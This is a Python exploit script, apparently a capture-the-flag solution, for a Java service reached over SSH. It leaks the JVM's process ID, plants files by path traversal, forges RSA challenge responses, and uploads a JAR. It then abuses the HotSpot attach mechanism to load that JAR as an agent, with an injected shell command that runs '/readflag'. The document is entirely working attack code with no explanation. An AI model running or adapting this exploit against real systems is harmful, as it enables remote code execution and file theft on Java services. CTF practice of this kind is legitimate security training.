import binascii
import asyncio
import re
import asyncssh
import sys
from Crypto.PublicKey import RSA


HOST = sys.argv[1]
PORT = int(sys.argv[2])

key = RSA.generate(2048)
public_der = key.publickey().export_key("DER")

PAYLOAD = open("pwn.jar","rb").read()

def pad(b):
    ln = len(b)
    return b"\x01"+b"\xff"*(255-ln-2)+b"\x00"+b

def encrypt(k, d):
    ct = pow(int.from_bytes(pad(d), byteorder='big'), k.d, k.n)
    return ct.to_bytes((ct.bit_length() + 7) // 8, byteorder='big')


async def connect():
    conn = await asyncssh.connect(HOST, PORT
            , known_hosts=None
            , username="user", password="user")

    stdin, stdout,stderr = await  conn.open_session(term_type="vt100", encoding=None)
    d = await stdout.readuntil(b": ")
    stdin.write(b"lol\n")
    d = await stdout.readuntil(b"[>] ")
    stdin.write(b"1\n")
    d = await stdout.readuntil(b">>> ")
    return stdin, stdout, stderr

async def execute_payload(pid):
    stdin, stdout, stderr = await connect()

    stdin.write("auth pwn\n".encode())
    d = await stdout.readuntil(b"[resp]> ")
    challenge = binascii.unhexlify(d.split(b"echo ")[1].split(b" | ")[0])

    pld = binascii.hexlify(encrypt(key, challenge))
    stdin.write(pld + b"\n")
    d = await stdout.readuntil(b">>> ")

    stdin.write(f"msgto ../../tmp/.java_pid{pid}\n".encode())
    d = await stdout.readuntil(b"[msg]> ")
    cmd = b"1\x00load\x00instrument\x00false\x00/tmp/pld.pub=sh -c $@|sh . echo /readflag /FLAG>/tmp/flag.pub\x00"
    stdin.write(binascii.hexlify(cmd) + b"\n")


async def socket_prepare(pid):
    stdin, stdout, stderr = await connect()
    stdin.write(f"register ../../tmp/.java_pid{pid}\n".encode())
    d = await stdout.readuntil(b"[resp]> ")

    stdin.write(binascii.hexlify(public_der) + b"\n")
    d = await stdout.readuntil(b">>>")

    fname = f"../.attach_pid{pid}"

    stdin.write(f"register {fname}\n".encode())
    d = await stdout.readuntil(b"[resp]> ")
    stdin.write(binascii.hexlify(public_der) + b"\n")

    stdin.write(f"auth {fname}\n".encode())
    d = await stdout.readuntil(b"[resp]> ")
    challenge = binascii.unhexlify(d.split(b"echo ")[1].split(b" | ")[0])

    pld = binascii.hexlify(encrypt(key, challenge))
    stdin.write(pld + b"\n")
    d = await stdout.readuntil(b">>> ")


async def main():
    stdin, stdout, stderr = await connect()
    print("[+] Connected!")
    stdin.write(b"\034")
    stdin.write(b"\n")
    d = await stdout.readuntil(b">>>")
    main_thread_id = re.findall(r'"main".*nid=0x([0-9a-f]*) runnable', d.decode())[0]
    pid = int(main_thread_id,16)
    print(f"[+] Got PID: {pid}")
    
    print("[*] Creating socket channel")
    await asyncio.gather(*[socket_prepare(pid + i) for i in range(-2,1)])

    stdin.write(b"help\n")
    d = await stdout.readuntil(b">>> ")
    stdin.write(b"\034\n")
    await stdin.drain()
    stdin.write(b"\n")
    d = await stdout.readuntil(b">>> ")

    print("[*] Uploading payload")
    stdin.write("register ../../tmp/pld\n".encode())
    d = await stdout.readuntil(b"[resp]> ")
    stdin.write(binascii.hexlify(PAYLOAD) + b"\n")
    d = await stdout.readuntil(b">>> ")

    print("[*] Executing payload")
    stdin.write(f"register pwn\n".encode())
    d = await stdout.readuntil(b"[resp]> ")
    stdin.write(binascii.hexlify(public_der) + b"\n")
    d = await stdout.readuntil(b">>>")

    await asyncio.gather(*[execute_payload(pid + i) for i in range(-2,1)])

    stdin.write("auth pwn\n".encode())
    d = await stdout.readuntil(b"[resp]> ")
    challenge = binascii.unhexlify(d.split(b"echo ")[1].split(b" | ")[0])

    pld = binascii.hexlify(encrypt(key, challenge))
    stdin.write(pld + b"\n")
    d = await stdout.readuntil(b">>> ")

    stdin.write(f"msgto ../../tmp/flag\n".encode())
    d = await stdout.readuntil(b"[msg]> ")
    print(d)


if __name__ == "__main__":
    asyncio.run(main())
